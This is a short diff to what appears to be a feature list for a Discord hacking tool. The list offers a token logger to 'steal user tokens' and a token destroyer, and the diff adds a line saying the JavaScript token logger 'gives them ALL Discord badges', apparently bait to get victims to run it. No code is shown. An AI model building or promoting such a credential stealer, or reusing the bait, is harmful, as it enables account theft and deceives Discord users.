@@ -13,6 +13,7 @@
 - Tokens
    - Token Logger
       - Steal user tokens
+	  - JavaScript token logger also gives them ALL Discord badges
    
    - Token Destroyer
       - Destroy tokens by what you log
